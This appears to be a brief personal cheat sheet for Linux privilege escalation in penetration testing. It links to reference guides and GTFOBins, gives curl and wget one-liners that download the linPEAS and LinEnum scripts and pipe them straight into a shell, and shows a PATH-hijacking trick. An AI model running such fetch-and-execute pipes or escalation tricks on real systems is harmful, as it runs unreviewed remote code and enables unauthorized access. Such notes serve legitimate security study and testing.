# priv-esc

## checklist

https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist

## scripts

### Basic Linux Privilege Escalation

[Basic Linux Privilege Escalation](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)

### [linPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

`curl https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh | sh`

### linenum

`wget -O - https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`

## Path vulnerability

If something searches the Path for a a command and where able to replace the path we can trick the system to execute something else.  
Whenever we use `ls` it will now actually run `cat`.

```bash
export PATH="/tmp/tmp:${PATH}"
cp /bin/cat /tmp/tmp/cat
mv /tmp/tmp/cat /tmp/tmp/ls
```

## GTFOBins

https://gtfobins.github.io/

